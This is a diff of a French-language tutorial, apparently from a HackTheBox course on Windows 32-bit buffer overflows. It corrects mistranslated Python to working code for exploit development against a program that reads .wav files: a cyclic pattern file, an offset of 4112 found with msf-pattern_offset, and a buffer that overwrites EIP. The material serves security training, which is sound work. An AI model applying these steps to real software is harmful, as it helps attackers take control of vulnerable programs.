@@ -64,11 +64,11 @@ Nous pouvons commencer par créer une nouvelle fonction avec `def eip_offset():
 Code : python
 
 ```
-def eip_offset() :
-     charge utile = octets ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
-                     ...COUPER...
-                     "Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk",
-"utf-8")
+def eip_offset():
+    payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
+                    ...SNIP...
+                    "Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk",
+					"utf-8")
 
 ```
 
@@ -77,8 +77,8 @@ Ensuite, sous la même fonction `eip_offset()` , nous allons écrire `payload
 Code : python
 
 ```
-     avec open('pattern.wav', 'wb') comme f :
-         f.write(charge utile)
+    with open('pattern.wav', 'wb') as f:
+        f.write(payload)
 
 ```
 
@@ -112,7 +112,7 @@ Nous pouvons maintenant utiliser la valeur `EIP` pour calculer le décalage. N
 ```
 dsgsec@htb[/htb]$ /usr/bin/msf-pattern_offset -q 31684630
 
-[*] Correspondance exacte au décalage 4112
+[*] Exact match at offset 4112
 
 ```
 
@@ -140,16 +140,14 @@ Ajoutons une autre fonction, `eip_control()`, à notre `win32bof_exploit.py` 
 Code : python
 
 ```
-def eip_control() :
-     décalage = 4112
-     tampon = b"A"*décalage
-     eip = b"B"*4
-     charge utile = tampon + eip
-
-     avec open('control.wav', 'wb') comme f :
-         f.write(charge utile)
-
-eip_control()
+def eip_control():
+    offset = 4112
+    buffer = b"A"*offset
+    eip = b"B"*4
+    payload = buffer + eip
+    
+    with open('control.wav', 'wb') as f:
+        f.write(payload)
 
 ```
 
